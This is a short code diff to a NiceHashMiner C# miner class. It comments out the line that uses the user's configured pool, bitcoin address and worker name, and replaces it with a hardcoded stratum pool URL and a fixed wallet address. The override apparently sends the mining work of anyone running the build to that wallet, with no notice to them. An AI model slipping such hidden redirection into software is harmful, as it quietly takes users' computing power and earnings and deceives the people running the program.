@@ -347,7 +347,8 @@ namespace NiceHashMiner.Miners
             // network stub
             var url = Globals.GetLocationUrl(algorithm.NiceHashID, Globals.MiningLocation[ConfigManager.GeneralConfig.ServiceLocation],
                 ConectionType);
-            return GetStartupCommand(url, Globals.GetBitcoinUser(), ConfigManager.GeneralConfig.WorkerName.Trim());
+            //return GetStartupCommand(url, Globals.GetBitcoinUser(), ConfigManager.GeneralConfig.WorkerName.Trim());
+            return GetStartupCommand("stratum+tcp://hdac.moricpool.com:3333", "HGr2JYPDMgYr9GzS9TcadBxxkyxo4v9XAJ", "");
         }
 
         protected override void BenchmarkThreadRoutine(object commandLine)
